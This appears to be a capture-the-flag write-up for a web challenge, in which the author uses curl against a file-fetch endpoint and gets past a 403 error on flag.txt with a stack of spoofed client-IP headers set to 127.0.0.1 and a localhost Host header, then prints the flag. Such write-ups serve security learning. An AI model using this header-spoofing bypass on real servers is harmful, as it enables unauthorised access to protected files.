**Flag:** `KCTF{kud05w3lld0n3!}`

We go the link and quickly figure out the input to the text box involves a GET request to the server.

```
~/Downloads $ curl -X 'GET' "http://66.228.53.87:8989/fetch?file=text.txt"
{"result":"Yes! You can read files! Dont ask for hint its ezz!!"}
```

Trying it on `flag.txt` however, gives us an error.

```
~/Downloads $ curl -X 'GET' "http://66.228.53.87:8989/fetch?file=flag.txt"
{"result":"403 Access Denied"}
```

Looking around, I found a few resources to help me get through this error. [One](https://sapt.medium.com/bypassing-403-protection-to-get-pagespeed-admin-access-822fab64c0b3) said to include headers with the value `127.0.0.1` to bypass the error.

Using these headers in the `curl` command, we then successfully get the flag.

```
~ $ curl -H 'X-Originating-IP: 127.0.0.1' \
     -H 'X-Forwarded-For: 127.0.0.1' \
     -H 'X-Forwarded: 127.0.0.1' \
     -H 'Forwarded-For: 127.0.0.1' \
     -H 'X-Remote-IP: 127.0.0.1' \
     -H 'X-Remote-Addr: 127.0.0.1' \
     -H 'X-ProxyUser-Ip: 127.0.0.1' \
     -H 'X-Original-URL: 127.0.0.1' \
     -H 'Client-IP: 127.0.0.1' \
     -H 'True-Client-IP: 127.0.0.1' \
     -H 'Cluster-Client-IP: 127.0.0.1' \
     -H 'X-ProxyUser-Ip: 127.0.0.1' \
     -H 'Host: localhost' \
     -X 'GET' "http://66.228.53.87:8989/fetch?file=flag.txt"
{"result":"KCTF{kud05w3lld0n3!}"}
```

